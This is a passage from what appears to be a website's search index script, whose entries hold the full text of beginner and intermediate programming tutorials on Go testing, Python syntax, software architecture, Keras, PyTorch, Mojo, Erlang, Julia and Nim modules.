Add(1, 2) } } You can run benchmarks using go test -bench=. which will execute all benchmarks in your test files.\nb. Profiling:\nGo provides built-in support for profiling your applications using tools like pprof. You can generate profiles for CPU, memory, and more.\nimport _ \"net/http/pprof\" func main() { go func() { log.Println(http.ListenAndServe(\"localhost:6060\", nil)) }() // your application code here } You can then access profiling data by visiting http://localhost:6060/debug/pprof/ in your browser.\nConclusion:\nMastering testing in Go can significantly improve the quality and performance of your applications. By integrating unit tests, leveraging the power of table-driven tests, and utilizing benchmarks and profiling, you can ensure your code is not only functional but also efficient. Take the time to integrate these practices into your development process, and you’ll see substantial benefits in the stability and performance of your software.\nNow, if you are interested in upskilling in 2024 with AI development, check out this 6 AI advanced projects with Go where you learng about building with AI and getting the best knowledge there is currently. Here’s the link\nFrequently Asked Questions:\nQ: How can I see more detailed output when running tests? A: Use go test -v for a verbose output, which includes detailed logging for each test.\n**Q: Can I run a specific test or benchmark?\n** A: Yes, use go test -run TestName or go test -bench BenchmarkName to run specific tests or benchmarks.\nQ: Are there any third-party tools or libraries recommended for Go testing? A: While the standard library is powerful, you might explore third-party tools like Testify for more advanced assertions and mocks, especially for more complex test setups.\n"
            }
        );
    index.add(
            {
                id:  173 ,
                href: "\/tutorials\/docs\/python\/python\/basic_python_syntax\/",
                title: "Mastering the Basics: Python Syntax, Indentation, and Comments",
                description: "Unlock the fundamentals of Python programming with a detailed exploration of its syntax. Learn through practical examples, including building a Fibonacci sequence, understanding the crucial role of indentation, and effectively using comments for better code readability.",
                content: "Introduction linkThe syntax of a programming language is a set of rules that defines how a program is written and interpreted. In Python, syntax is famously clean and often feels intuitive, making it an excellent choice for beginners. Yet, it possesses the depth required for advanced programming. This section explores Python syntax through various constructs and a practical example.\nFibonacci Series Example linkThe Fibonacci sequence is a classic example used to illustrate basic programming concepts in many languages. In Python, it can also demonstrate Python’s handling of functions, loops, and conditional statements.\ndef fibonacci(n): \"\"\"Generate a Fibonacci series up to n.\"\"\" a, b = 0, 1 result = [] while len(result) \u003c n: result.append(a) a, b = b, a + b return result # Calling the function to get the first 10 Fibonacci numbers fib_series = fibonacci(10) print(fib_series) In this example, fibonacci is a function that takes a number n and returns the first n Fibonacci numbers. The variables a and b start at 0 and 1, respectively, and are used to generate the next number in the sequence. The while loop continues to execute as long as the length of the result list is less than n.\nPython Indentation linkOne of Python’s distinctive features is its use of indentation to delimit blocks of code. Indentation improves the readability of the code and is not merely a matter of style in Python; it is a syntax requirement.\nif 5 \u003e 2: print(\"Five is greater than two!\") if 3 \u003e 1: print(\"Three is also greater than one!\") In this snippet, both print statements are executed because they are correctly indented. Incorrect indentation would lead to errors or unexpected behavior, emphasizing the importance of maintaining consistent indentation levels.\nComments in Python linkComments are non-executable parts of the program intended to describe what the code does. Python supports both single and multi-line comments. Single-line comments start with #, while multi-line comments can be written using triple quotes, although these are technically string literals and not comments. They can be used as comments when not assigned to a variable.\n# This is a single-line comment # For a block of comments, use a hash on each line # This is the second line of the comment \"\"\" This is a multi-line string used as a comment. It helps explain complex code in several lines. Python does not execute these lines as they are not assigned to any variable. \"\"\" Advanced Tip: Using Docstrings linkPython also supports documentation strings (docstrings) which are string literals that appear right after the definition of a function, method, class, or module. They are used by the Python interpreter to provide documentation:\ndef add(a, b): \"\"\" Add two numbers and return the result. Parameters: a (int or float): the first number b (int or float): the second number Returns: int or float: the sum of a and b \"\"\" return a + b Docstrings are a valuable tool for any developer and can be accessed through the built-in help() function.\nConclusion linkUnderstanding and applying Python’s basic syntax, proper indentation, and commenting practices are foundational skills for programming in Python. This blog has aimed to fortify these basics while providing practical examples to illustrate their application.\n"
            }
        );
    index.add(
            {
                id:  174 ,
                href: "\/tutorials\/docs\/technical-architecture\/technical-architecture\/microservice_vs_monolith\/",
                title: "Microservices vs. Monolithic Architecture: Which One to Choose?",
                description: "Understanding the Differences Between Monolithic and Microservices Architecture linkIn today’s dynamic software development landscape, choosing the right architectural approach is crucial for creating scalable, maintainable, and efficient applications. Two prominent architectural styles are Monolithic and Microservices architecture. This post will delve into the key differences between these two approaches, examining their benefits, drawbacks, and ideal use cases.\nMonolithic Architecture linkDefinition and Characteristics linkA monolithic architecture is a traditional software development model where all components of the application are interconnected and managed as a single unit.",
                content: "Understanding the Differences Between Monolithic and Microservices Architecture linkIn today’s dynamic software development landscape, choosing the right architectural approach is crucial for creating scalable, maintainable, and efficient applications. Two prominent architectural styles are Monolithic and Microservices architecture. This post will delve into the key differences between these two approaches, examining their benefits, drawbacks, and ideal use cases.\nMonolithic Architecture linkDefinition and Characteristics linkA monolithic architecture is a traditional software development model where all components of the application are interconnected and managed as a single unit. This means the entire application is built, tested, and deployed as one cohesive codebase.\nCharacteristics:\nSingle Codebase: The entire application is managed within a single codebase. Tightly Coupled: All components are interdependent and communicate within the same environment. Unified Deployment: The application is deployed as a single entity, typically on one server or environment. Benefits link Simplicity: Easier to start with, as it requires less upfront planning. Performance: Generally faster for smaller applications due to fewer network calls and reduced latency. Integrated Development: Easier to manage development within a single codebase. Drawbacks link Scalability Issues: Difficult to scale specific components independently. Complexity Over Time: As the application grows, it becomes harder to maintain and update. Risky Deployments: Any change requires redeploying the entire application, increasing the risk of downtime. Microservices Architecture linkDefinition and Characteristics linkMicroservices architecture breaks down an application into smaller, independent services that each handle specific business functions. These services communicate through well-defined APIs and can be developed, deployed, and scaled independently.\nCharacteristics:\nIndependent Services: Each service performs a single function and has its own codebase. Loosely Coupled: Services communicate through APIs, reducing interdependencies. Independent Deployment: Each service can be deployed independently, often using containers. Benefits link Scalability: Services can be scaled independently based on demand. Flexibility: Teams can use different technologies for different services. Fault Isolation: Failures in one service do not affect the entire system. Continuous Deployment: Easier to update and deploy individual services. Drawbacks link Complexity: Requires significant planning and design effort upfront. Debugging Challenges: Debugging across multiple services can be complex. Resource Intensive: Higher initial cost and resource requirements for infrastructure and setup. Key Differences linkDevelopment Process link Monolithic: Easier to start with minimal planning. The development can become complex over time due to the tightly coupled codebase. Microservices: Requires detailed planning and design initially. Easier to maintain and modify due to the decoupled nature of services. Deployment link Monolithic: The entire application is deployed as one unit. Simplifies initial deployment but complicates updates and scaling. Microservices: Each service is deployed independently, often using containers. Allows for more flexible and efficient updates and scaling. Debugging link Monolithic: Easier to trace data movement within a single environment. However, finding bugs can be challenging in large codebases. Microservices: Debugging requires coordinated efforts across multiple services, which can be time-consuming and complex. Modifications link Monolithic: Changes in one part of the application can impact the entire system. Requires extensive testing and redeployment. Microservices: Allows for targeted modifications to specific services without affecting the whole system. Supports continuous deployment. Scaling link Monolithic: The entire application must be scaled, even if only specific components require more resources. Microservices: Individual services can be scaled independently, optimizing resource use and reducing costs. Operational Impact link Monolithic: Limited flexibility in adopting new technologies. Higher risk during updates due to single point of failure. Microservices: Facilitates faster innovation, reduces deployment risks, and accelerates time to market. Offers long-term cost savings and scalability. When to Use Each Architecture linkMonolithic Architecture link Simple Applications: Ideal for smaller projects or prototypes where the complexity of microservices is not justified. Startups: When rapid development and deployment are critical, and scaling is not a primary concern. Legacy Systems: Existing applications that are not expected to scale significantly. Microservices Architecture link Complex Systems: Best suited for large, complex applications that require high scalability and flexibility. Frequent Updates: When continuous deployment and independent updates are essential. High Traffic: Applications that experience varying load patterns and require efficient resource utilization. Transitioning from Monolithic to Microservices linkMigrating from a monolithic architecture to microservices involves several steps:\nPlanning: Develop a detailed migration strategy, considering risks, timelines, and business objectives. Containerization: Start by containerizing the monolithic application to decouple it from specific hardware requirements. Service Identification: Identify and partition the monolithic codebase into discrete microservices. DevOps Practices: Implement CI/CD pipelines and adopt DevOps practices to streamline the development and deployment of microservices. Deployment: Deploy the microservices on a scalable cloud infrastructure, ensuring monitoring and security are in place. Conclusion linkChoosing between monolithic and microservices architecture depends on your project’s specific needs, complexity, and growth expectations. Monolithic architecture offers simplicity and ease of development for smaller projects, while microservices provide scalability, flexibility, and resilience for larger, more complex systems. By understanding the strengths and challenges of each approach, you can make an informed decision that aligns with your business goals and technical requirements.\n"
            }
        );
    index.add(
            {
                id:  175 ,
                href: "\/tutorials\/docs\/keras\/keras\/evaluation_and_prediction\/",
                title: "Model evaludation and prediction in keras(Advanced)",
                description: "Learn about model evaluation and prediction in keras.",
                content: "This chapter deals with the model evaluation and model prediction in Keras.\nLet us begin by understanding the model evaluation.\nModel Evaluation linkEvaluation is a process during development of the model to check whether the model is best fit for the given problem and corresponding data. Keras model provides a function, evaluate which does the evaluation of the model. It has three main arguments,\nTest data Test data label verbose - true or false Let us evaluate the model, which we created in the previous chapter using test data.\nscore = model.evaluate(x_test, y_test, verbose = 0) print('Test loss:', score[0]) print('Test accuracy:', score[1]) Executing the above code will output the below information.\n0 The test accuracy is 98.28%. We have created a best model to identify the handwriting digits. On the positive side, we can still scope to improve our model.\nModel Prediction linkPrediction is the final step and our expected outcome of the model generation. Keras provides a method, predict to get the prediction of the trained model. The signature of the predict method is as follows,\npredict( x, batch_size = None, verbose = 0, steps = None, callbacks = None, max_queue_size = 10, workers = 1, use_multiprocessing = False ) Here, all arguments are optional except the first argument, which refers the unknown input data. The shape should be maintained to get the proper prediction.\nLet us do prediction for our MPL model created in previous chapter using below code −\npred = model.predict(x_test) pred = np.argmax(pred, axis = 1)[:5] label = np.argmax(y_test,axis = 1)[:5] print(pred) print(label) Here,\nLine 1 call the predict function using test data. Line 2 gets the first five prediction Line 3 gets the first five labels of the test data. Line 5 - 6 prints the prediction and actual label. The output of the above application is as follows −\n[7 2 1 0 4] [7 2 1 0 4] The output of both array is identical and it indicate that our model predicts correctly the first five images.\n"
            }
        );
    index.add(
            {
                id:  176 ,
                href: "\/tutorials\/docs\/pytorch\/pytorch\/model_training_and_evaluation\/",
                title: "Model Training and Evaluation",
                description: "Understanding Model Training and Evaluation in PyTorch.",
                content: "Introduction to Model Training and Evaluation linkModel training and evaluation are critical steps in the machine learning workflow. PyTorch provides a flexible framework for training and evaluating deep learning models. In this tutorial, we’ll explore the process of training and evaluating models using PyTorch.\nDefine the Model Architecture linkThe first step in model training is defining the architecture of the neural network. PyTorch provides the torch.nn module for building neural network architectures. You can define custom models by subclassing nn.Module and implementing the forward method.\nExample: Define a Simple Neural Network link import torch import torch.nn as nn class SimpleNN(nn.Module): def __init__(self): super(SimpleNN, self).__init__() self.fc1 = nn.Linear(10, 50) self.relu = nn.ReLU() self.fc2 = nn.Linear(50, 1) def forward(self, x): x = self.fc1(x) x = self.relu(x) x = self.fc2(x) return x Training the Model linkOnce the model architecture is defined, you can train the model using a training dataset. The training process typically involves iterating over the dataset in batches, computing predictions using the model, calculating the loss, and updating the model parameters using gradient descent optimization algorithms.\nExample: Training a Simple Neural Network link # Define loss function and optimizer criterion = nn.MSELoss() optimizer = torch.optim.SGD(model.parameters(), lr=0.01) # Training loop for epoch in range(num_epochs): # Forward pass outputs = model(inputs) loss = criterion(outputs, targets) # Backward pass and optimization optimizer.zero_grad() loss.backward() optimizer.step() # Print progress if (epoch+1) % 10 == 0: print(f'Epoch [{epoch+1}/{num_epochs}], Loss: {loss.item():.4f}') Evaluating the Model linkAfter training the model, it’s essential to evaluate its performance on a separate validation dataset. Evaluation metrics such as accuracy, precision, recall, and F1 score can provide insights into the model’s performance on unseen data.\nExample: Evaluating a Model link # Evaluation loop with torch.no_grad(): model.eval() for inputs, targets in dataloader: outputs = model(inputs) # Compute evaluation metrics Hyperparameter Tuning linkHyperparameters such as learning rate, batch size, and number of epochs significantly impact the performance of a model. Hyperparameter tuning involves finding the optimal set of hyperparameters through experimentation and validation.\nConclusion linkModel training and evaluation are essential steps in developing machine learning models. PyTorch provides a flexible and efficient framework for training and evaluating deep learning models, enabling you to build and deploy state-of-the-art machine learning systems effectively.\nThis markdown provides a comprehensive overview of model training and evaluation in PyTorch, covering model architecture definition, training process, evaluation metrics, and hyperparameter tuning. "
            }
        );
    index.add(
            {
                id:  177 ,
                href: "\/tutorials\/docs\/keras\/keras\/advanced_model_tuning_andoptimization_techniques_in_keras\/",
                title: "Model Tuning and Optimization Techniques in Keras ",
                description: "This tutorial covers advanced techniques for tuning and optimizing models in Keras, including hyperparameter tuning, regularization methods, and learning rate schedulers.\nHyperparameter Tuning linkHyperparameter tuning is crucial for improving the performance of machine learning models. Keras provides several ways to perform hyperparameter tuning.\nGrid Search linkGrid search exhaustively searches through a specified subset of hyperparameters. It is straightforward but can be computationally expensive.\nfrom sklearn.model_selection import GridSearchCV from keras.wrappers.scikit_learn import KerasClassifier def create_model(optimizer='adam'): model = Sequential() model.",
                content: "This tutorial covers advanced techniques for tuning and optimizing models in Keras, including hyperparameter tuning, regularization methods, and learning rate schedulers.\nHyperparameter Tuning linkHyperparameter tuning is crucial for improving the performance of machine learning models. Keras provides several ways to perform hyperparameter tuning.\nGrid Search linkGrid search exhaustively searches through a specified subset of hyperparameters. It is straightforward but can be computationally expensive.\nfrom sklearn.model_selection import GridSearchCV from keras.wrappers.scikit_learn import KerasClassifier def create_model(optimizer='adam'): model = Sequential() model.add(Dense(12, input_dim=8, activation='relu')) model.add(Dense(1, activation='sigmoid')) model.compile(loss='binary_crossentropy', optimizer=optimizer, metrics=['accuracy']) return model model = KerasClassifier(build_fn=create_model, verbose=0) optimizers = ['rmsprop', 'adam'] epochs = [50, 100] batches = [5, 10] param_grid = dict(optimizer=optimizers, epochs=epochs, batch_size=batches) grid = GridSearchCV(estimator=model, param_grid=param_grid, n_jobs=-1, cv=3) grid_result = grid.fit(X, Y) print(f\"Best: {grid_result.best_score_} using {grid_result.best_params_}\") Random Search linkRandom search samples a wide range of hyperparameters randomly. It is often more efficient than grid search.\nfrom sklearn.model_selection import RandomizedSearchCV param_dist = dict(optimizer=optimizers, epochs=epochs, batch_size=batches) random = RandomizedSearchCV(estimator=model, param_distributions=param_dist, n_iter=10, n_jobs=-1, cv=3) random_result = random.fit(X, Y) print(f\"Best: {random_result.best_score_} using {random_result.best_params_}\") Bayesian Optimization linkBayesian optimization models the function that maps hyperparameters to the objective value and uses this model to select the next set of hyperparameters to evaluate.\nfrom keras_tuner import BayesianOptimization def build_model(hp): model = Sequential() model.add(Dense(units=hp.Int('units', min_value=32, max_value=512, step=32), activation='relu')) model.add(Dense(1, activation='sigmoid')) model.compile(optimizer=hp.Choice('optimizer', ['adam', 'rmsprop']), loss='binary_crossentropy', metrics=['accuracy']) return model tuner = BayesianOptimization(build_model, objective='val_accuracy', max_trials=10, executions_per_trial=3) tuner.search(X_train, y_train, epochs=50, validation_data=(X_val, y_val)) best_hps = tuner.get_best_hyperparameters(num_trials=1)[0] print(f\"Best hyperparameters: {best_hps.values}\") Regularization Techniques linkRegularization techniques help prevent overfitting by adding a penalty to the model’s complexity.\nL1 and L2 Regularization linkL1 regularization adds the absolute value of the coefficients, while L2 adds the squared value.\nfrom keras.regularizers import l1, l2 model.add(Dense(64, input_dim=64, activation='relu', kernel_regularizer=l2(0.01))) model.add(Dense(64, activation='relu', kernel_regularizer=l1(0.01))) Dropout linkDropout randomly sets a fraction of input units to 0 at each update during training time, which helps prevent overfitting.\nfrom keras.layers import Dropout model.add(Dropout(0.5)) Batch Normalization linkBatch normalization normalizes the inputs of each layer so that they have a mean of 0 and a standard deviation of 1.\nfrom keras.layers import BatchNormalization model.add(BatchNormalization()) Learning Rate Schedulers linkLearning rate schedulers adjust the learning rate during training, which can help improve performance and convergence.\nStep Decay linkStep decay reduces the learning rate by a factor every few epochs.\ndef step_decay(epoch): initial_lr = 0.1 drop = 0.5 epochs_drop = 10.0 lr = initial_lr * (drop ** np.floor((1+epoch)/epochs_drop)) return lr from keras.callbacks import LearningRateScheduler lr_scheduler = LearningRateScheduler(step_decay) model.fit(X_train, y_train, epochs=100, callbacks=[lr_scheduler]) Exponential Decay linkExponential decay reduces the learning rate exponentially over epochs.\ndef exp_decay(epoch): initial_lr = 0.1 k = 0.1 lr = initial_lr * np.exp(-k*epoch) return lr lr_scheduler = LearningRateScheduler(exp_decay) model.fit(X_train, y_train, epochs=100, callbacks=[lr_scheduler]) LearningRateScheduler Callback linkKeras provides a LearningRateScheduler callback to implement custom learning rate schedules.\ndef custom_lr_schedule(epoch, lr): if epoch \u003c 10: return lr else: return lr * tf.math.exp(-0.1) lr_scheduler = LearningRateScheduler(custom_lr_schedule) model.fit(X_train, y_train, epochs=100, callbacks=[lr_scheduler]) By applying these advanced tuning and optimization techniques, you can significantly improve the performance and efficiency of your Keras models.\n"
            }
        );
    index.add(
            {
                id:  178 ,
                href: "\/tutorials\/docs\/mojo\/mojo\/modules_and_packages\/",
                title: "Modules and Packages in Mojo",
                description: "Mojo Lang description",
                content: "Overview linkModules and packages in Mojo, while having some similarities, differ significantly from Python’s approach. Understanding these differences is key to leveraging Mojo effectively, especially as the language continues to evolve and adopt a robust package management system.\nMojo Files and Main Function linkIn Mojo, like in many programming languages, a main function is essential for executing code. This is evident when creating and running Mojo files. Example of a Mojo File (hello.mojo):\nfn main(): print(\"Hello, world!\") To run this file, use the command: mojo hello.mojo.\nScripting with Arguments linkSuppose you want to turn a script into a calculator that adds numbers passed as arguments. In this case, the approach of using a main function in Mojo files remains valid.\nCreating Modules linkWhen building reusable code with structures and methods, a different approach is needed, particularly when the code doesn’t depend on a main function. Creating a Module (mymodule.mojo):\nstruct MyPair: var first: Int var second: Int fn __init__(inout self, first: Int, second: Int): self.first = first self.second = second fn dump(self): print(self.first, self.second) Using Modules in Mojo Files linkYou can include and use modules in your main Mojo file through various import methods. Importing and Using a Module in hello.mojo:\n# Option 1: Specific Import from mymodule import MyPair fn main(): let mine = MyPair(2, 4) mine.dump() # Option 2: Generic Import import mymodule fn main(): let mine = mymodule.MyPair(2, 4) mine.dump() # Option 3: Import with Alias import mymodule as my fn main(): let mine = my.MyPair(2, 4) mine.dump() Mojo Packages linkPackages in Mojo are used to organize and distribute a collection of related modules. Example Package Structure:\nmain.mojo mypackage/ __init__.mojo mymodule.mojo Using a Package in main.mojo:\nfrom mypackage.mymodule import MyPair fn main(): let mine = MyPair(2, 4) mine.dump() Creating a Mojo Package:\nTo bundle your package for distribution, you can use the Mojo package command: mojo package mypackage -o mypack.mojopkg\n"
            }
        );
    index.add(
            {
                id:  179 ,
                href: "\/tutorials\/docs\/erlang\/erlang\/modules_in_erlang\/",
                title: "Modules in Erlang Programming Language",
                description: "Modules in Erlang are collections of functions grouped within a single file under a unified name. In Erlang, all functions must be defined within modules.\nMany fundamental functionalities, such as arithmetic, logic, and Boolean operations, are readily available as default modules loaded upon program execution. However, any other function defined within a module must be invoked in the format: Module:Function(Arguments).\nDefining a Module linkModules can declare two primary entities: functions and attributes.",
                content: "Modules in Erlang are collections of functions grouped within a single file under a unified name. In Erlang, all functions must be defined within modules.\nMany fundamental functionalities, such as arithmetic, logic, and Boolean operations, are readily available as default modules loaded upon program execution. However, any other function defined within a module must be invoked in the format: Module:Function(Arguments).\nDefining a Module linkModules can declare two primary entities: functions and attributes. Attributes serve as metadata describing the module itself, including its name, externally visible functions, authorship details, and more. This metadata aids the compiler in its tasks and enables users to retrieve essential information from compiled code without needing to consult the source.\nThe syntax for declaring a function within a module is as follows:\n-module(modulename). Here, modulename represents the name of the module and must be the first line of code within the module.\nConsider the following example of a module named helloworld:\n-module(helloworld). -export([start/0]). start() -\u003e io:fwrite(\"Hello World\"). The output of this program is:\nHello World Module Attributes linkA module attribute defines specific properties of a module and comprises a tag and a corresponding value.\nThe general syntax for an attribute is:\n-Tag(Value). Below is an example demonstrating the usage of attributes:\n-module(helloworld). -author(\"TutorialPoint\"). -version(\"1.0\"). -export([start/0]). start() -\u003e io:fwrite(\"Hello World\"). In this example, two custom attributes, author and version, are defined, containing the program’s author and version number, respectively.\nThe output of the program remains:\nHello World Pre-built Attributes linkErlang provides pre-built attributes that can be attached to modules. Let’s explore them:\nExport linkThe export attribute specifies a list of functions and their arity to be exported for use by other modules, thereby defining the module’s interface.\n-export([FunctionName1/FunctionArity1,...,FunctionNameN/FunctionArityN]). Consider the following example:\n-module(helloworld). -author(\"TutorialPoint\"). -version(\"1.0\"). -export([start/0]). start() -\u003e io:fwrite(\"Hello World\"). The output of this program is unchanged:\nHello World Import linkThe import attribute enables the importation of functions from another module for local use.\n-import(modulename, [functionname/parameter]). In the following example, the io module and its fwrite function are imported:\n-module(helloworld). -import(io, [fwrite/1]). -export([start/0]). start() -\u003e fwrite(\"Hello, world!\\n\"). With this importation, mentioning the io module name is unnecessary whenever invoking the fwrite function.\nThe output of this program is:\nHello, world! These attributes serve to enhance the modularity and flexibility of Erlang programs, facilitating clear organization and reuse of code components.\n"
            }
        );
    index.add(
            {
                id:  180 ,
                href: "\/tutorials\/docs\/julia\/julia\/modules_in_julia\/",
                title: "Modules in Julia",
                description: "Julia, a high-level, high-performance programming language, is designed for technical computing",
                content: "Modules in Julia help organize code into manageable sections, providing separate namespaces, precompilation capabilities, and detailed namespace management. Here’s a simplified guide to understanding and using modules in Julia:\nBasic Structure of a Module linkA module in Julia is defined using the module ... end syntax. Inside, you can define functions, types, constants, and other variables. Modules create separate namespaces to avoid name conflicts and allow detailed management of which names (functions, variables, etc.) are available to other modules.\nmodule MyModule export myFunction myFunction(x) = x + 1 const MY_CONSTANT = 42 end Using Modules linkTo use a module, you can load it with the using or import statements. using brings the module and its exported names into the current scope, while import only brings the module itself, requiring you to qualify the names with the module name.\nusing MyModule # Now you can use myFunction and MY_CONSTANT directly import MyModule # Use MyModule.myFunction and MyModule.MY_CONSTANT Exporting Names linkUse the export keyword inside a module to specify which names should be available to other modules when using is applied.\nmodule ExampleModule export myExportedFunction myExportedFunction() = \"Hello\" hiddenFunction() = \"Hidden\" end using ExampleModule # Only myExportedFunction is available Qualified Names linkNames in the global scope of a module can be referred to outside their parent module by prefixing them with the module name.\nExampleModule.myExportedFunction() # Using the qualified name Importing Specific Names linkTo import specific names from a module, use using ModuleName: name1, name2 or import ModuleName: name1, name2.\nusing ExampleModule: myExportedFunction import ExampleModule: myExportedFunction Handling Name Conflicts linkIf two modules export the same name, you must qualify the name with the module to avoid conflicts.\nmodule A export f f() = 1 end module B export f f() = 2 end using .A, .B A.f() # Refers to f from module A B.f() # Refers to f from module B Renaming Imports linkYou can rename imported names to avoid conflicts or for convenience.\nimport CSV: read as csv_read csv_read(\"file.csv\") Submodules and Relative Paths linkModules can contain submodules, which help organize code further. Use relative paths with using or import to refer to parent or sibling modules.\nmodule ParentModule module SubModule1 export subFunction subFunction() = \"Sub\" end using .SubModule1 end using .ParentModule.SubModule1: subFunction Module Initialization and Precompilation linkModules can be precompiled for faster loading. Use the __init__() function for runtime initialization tasks that cannot be done during precompilation.\nmodule MyPrecompModule __precompile__() const myDataPtr = Ref{Ptr{Cvoid}}(0) function __init__() ccall((:foo_init, :libfoo), Cvoid, ()) myDataPtr[] = ccall((:foo_data, :libfoo), Ptr{Cvoid}, ()) end end This guide covers the basics of using modules in Julia, helping you organize code effectively and manage namespaces to avoid conflicts.\n"
            }
        );
    index.add(
            {
                id:  181 ,
                href: "\/tutorials\/docs\/keras\/keras\/modules_in_keras\/",
                title: "Modules in keras",
                description: "Learn more about modules in keras.",
                content: "Keras modules contains pre-defined classes, functions and variables which are useful for deep learning algorithm. Let us learn the modules provided by Keras in this chapter.\nAvailable modules linkLet us first see the list of modules available in the Keras.\nInitializers − Provides a list of initializers function. We can learn it in details in Keras layer chapter. during model creation phase of machine learning.\nRegularizers − Provides a list of regularizers function. We can learn it in details in Keras Layers chapter.\nConstraints − Provides a list of constraints function. We can learn it in details in Keras Layers chapter.\nActivations − Provides a list of activator function. We can learn it in details in Keras Layers chapter.\nLosses − Provides a list of loss function. We can learn it in details in Model Training chapter.\nMetrics − Provides a list of metrics function. We can learn it in details in Model Training chapter.\nOptimizers − Provides a list of optimizer function. We can learn it in details in Model Training chapter.\nCallback − Provides a list of callback function. We can use it during the training process to print the intermediate data as well as to stop the training itself (EarlyStopping method) based on some condition.\nText processing − Provides functions to convert text into NumPy array suitable for machine learning. We can use it in data preparation phase of machine learning.\nImage processing − Provides functions to convert images into NumPy array suitable for machine learning. We can use it in data preparation phase of machine learning.\nSequence processing − Provides functions to generate time based data from the given input data. We can use it in data preparation phase of machine learning.\nBackend − Provides function of the backend library like TensorFlow and Theano.\nUtilities − Provides lot of utility function useful in deep learning.\nLet us see backend module and utils model in this section.\nbackend module linkbackend module is used for keras backend operations. By default, keras runs on top of TensorFlow backend. If you want, you can switch to other backends like Theano or CNTK. Defualt backend configuration is defined inside your root directory under .keras/keras.json file.\nKeras backend module can be imported using below code\n\u003e\u003e\u003e from keras import backend as k If we are using default backend TensorFlow, then the below function returns TensorFlow based information as specified below −\n\u003e\u003e\u003e k.backend() 'tensorflow' \u003e\u003e\u003e k.epsilon() 1e-07 \u003e\u003e\u003e k.image_data_format() 'channels_last' \u003e\u003e\u003e k.floatx() 'float32' Let us understand some of the significant backend functions used for data analysis in brief −\nget_uid() linkIt is the identifier for the default graph. It is defined below −\n\u003e\u003e\u003e k.get_uid(prefix='') 1 \u003e\u003e\u003e k.get_uid(prefix='') 2 reset_uids linkIt is used resets the uid value.\n\u003e\u003e\u003e k.reset_uids() Now, again execute the get_uid(). This will be reset and change again to 1.\n\u003e\u003e\u003e k.get_uid(prefix='') 1 placeholder linkIt is used instantiates a placeholder tensor. Simple placeholder to hold 3-D shape is shown below −\n\u003e\u003e\u003e data = k.placeholder(shape = (1,3,3)) \u003e\u003e\u003e data "
            }
        );
    index.add(
            {
                id:  182 ,
                href: "\/tutorials\/docs\/nim\/nim\/modules\/",
                title: "Modules in Nim",
                description: "Learn more about nim's module system",
                content: "Modules linkSo far we have used the functionality which is available by default every time we start a new Nim file. This can be extended with modules, which give more functionality for some specific topics.\nSome of the most used Nim modules are:\nstrutils: additional functionality when dealing with strings sequtils: additional functionality for sequences math: mathematical functions (logarithms, square roots, …), trigonometry (sin, cos, …) times: measure and deal with time But there are many more, both in what’s called the standard library and in the Nimble package manager.\nImporting a module linkIf we want to import a module and all of its functionality, all we have to do is put import in our file. This is commonly done at the top of the file so we can easily see what our code uses.\nExample: stringutils.nim link import strutils let a = \"My string with whitespace.\" b = '!' echo a.split() echo a.toUpperAscii() echo b.repeat(5) Importing strutils. Using split from strutils module. It splits the string into a sequence of words. toUpperAscii converts all ASCII letters to uppercase. repeat is also from strutils module, and it repeats either a character or a whole string the requested amount of times. Output:\n@[\"My\", \"string\", \"with\", \"whitespace.\"] MY STRING WITH WHITESPACE. !!!!! To users coming from other programming languages (especially Python), the way that imports work in Nim might seem “wrong”.\nExample: maths.nim link import math let c = 30.0 # degrees cRadians = c.degToRad() echo cRadians echo sin(cRadians).round(2) echo 2^5 Importing math. Converting degrees to radians with degToRad. sin takes radians. We round (also from math module) the result to at most 2 decimal places. (Otherwise the result would be: 0.4999999999999999) Math module also has ^ operator for calculating powers of a number. Output:\n0.5235987755982988 0.5 32 Creating our own linkOften times we have so much code in a project that it makes sense to split it into pieces that each do a certain thing. If you create two files side by side in a folder, let’s call them firstFile.nim and secondFile.nim, you can import one from the other as a module:\nfirstFile.nim link proc plus*(a, b: int): int = return a + b proc minus(a, b: int): int = return a - b Notice how the plus procedure now has an asterisk (*) after its name; this tells Nim that another file importing this one will be able to use this procedure.\nBy contrast, this will not be visible when importing this file.\nsecondFile.nim link import firstFile echo plus(5, 10) echo minus(10, 5) # error Here we import firstFile.nim. We don’t need to put the .nim extension on here.\nThis will work fine and output 15 as it’s declared in firstFile and visible to us.\nHowever, this will throw an error as the minus procedure is not visible since it doesn’t have an asterisk behind its name.\nIn case you have more than these two files, you might want to organize them in a subdirectory (or more than one subdirectory). With the following directory structure:\n. ├── myOtherSubdir │ ├── fifthFile.nim │ └── fourthFile.nim ├── mySubdir │ └── thirdFile.nim ├── firstFile.nim └── secondFile.nim If you wanted to import all other files in your secondFile.nim, this is how you would do it:\nimport firstFile import mySubdir/thirdFile import myOtherSubdir / [fourthFile, fifthFile] Interacting with user input linkUsing the stuff we’ve introduced so far (basic data types and containers, control flow, loops) allows us to make quite a few simple programs. In this chapter we will learn how to make our programs more interactive. For that we need an option to read data from a file, or ask a user for an input.\nReading from a file linkLet’s say we have a text file called people.txt in the same directory as our Nim code. The contents of that file look like this:\npeople.txt link Alice A. Bob B. Carol C. We want to use the contents of that file in our program, as a list (sequence) of names.\nreadFromFile.nim link import strutils let contents = readFile(\"people.txt\") echo contents let people = contents.splitLines() echo people To read contents of a file, we use the readFile procedure, and we provide a path to the file from which to read (if the file is in the same directory as our Nim program, providing a filename is enough). The result is a multiline string. To split a multiline string into a sequence of strings (each string contains all the contents of a single line) we use splitLines from the strutils module. Output:\nAlice A. Bob B. Carol C. @[\"Alice A.\", \"Bob B.\", \"Carol C.\", \"\"] There was a final new line (empty last line) in the original file, which is also present here. Because of the final new line, our sequence is longer than we expected/wanted. To solve the problem of a final new line, we can use the strip procedure from strutils after we have read from a file. All this does is remove any so-called whitespace from the start and end of our string. Whitespace is simply any character that makes some space, new-lines, spaces, tabs, etc.\nreadFromFile2.nim link import strutils let contents = readFile(\"people.txt\").strip() echo contents let people = contents.splitLines() echo people Using strip provides the expected results.\nOutput:\nAlice A. Bob B. Carol C. @[\"Alice A.\", \"Bob B.\", \"Carol C.\"] Reading user input linkIf we want to interact with a user, we must be able to ask them for an input, and then process it and use it. We need to read from standard input (stdin) by passing stdin to the readLine procedure.\ninteraction1.nim link echo \"Please enter your name:\" let name = readLine(stdin) echo \"Hello \", name, \", nice to meet you!\" The type of name is inferred to be a string.\nOutput:\nPlease enter your name: Waiting for user input. After we write our name and press Enter, the program will continue.\nPlease enter your name: Alice Hello Alice, nice to meet you! Dealing with numbers linkReading from a file or from user input always gives a string as a result. If we would like to use numbers, we need to convert strings to numbers: we again use the strutils module and use parseInt to convert to integers or parseFloat to convert into a float.\ninteraction2.nim link import 